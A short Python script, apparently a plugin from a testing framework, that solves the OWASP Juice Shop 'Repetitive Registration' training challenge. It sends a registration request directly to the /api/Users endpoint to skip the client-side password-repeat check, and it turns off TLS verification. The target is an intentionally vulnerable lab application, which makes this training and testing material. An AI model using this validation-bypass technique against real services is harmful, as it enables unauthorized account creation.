"""
This file is used to solve the OWASP Juice-shop Task REPETITIVE REGISTRATION
Principle: If we have successfully repeated our password, we can change the first password
Methodology: If we are using request, we can avoid the checking.
"""

import time
import requests

from plugins import attack as a
from plugins import test_user_generate as usrGen
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_repetitive_registration(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/api/Users'
        usr = usrGen.new_user_generate()
        self.email = usr.generate_email()
        self.password = '123456'

    def generator(self):
        json_data = {
            'email': self.email,
            'password': self.password,
            'passwordRepeat': self.password,
            'securityQuestion': {
                'id': 2,
                'question': 'Mother\'s maiden name?',
            },
            'securityAnswer': 'test',
        }
        return json_data

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Repetitive Registration")
        a.logging.info(logger)
        a.logging.info('Started')
        json_data = self.generator()
        response = a.requests.post(self.url, json=json_data, verify=False)
        print(response.status_code)
        print(response.text)
        if response.status_code == 201:
            print("Congratulations! You have successfully finished task Repetitive Registration")
            print("Now you can login with user email " + self.email + " and password " + self.password)
            userid = response.json()["data"]["id"]
            return self.email, self.password, userid
        a.logging.info('Finished')









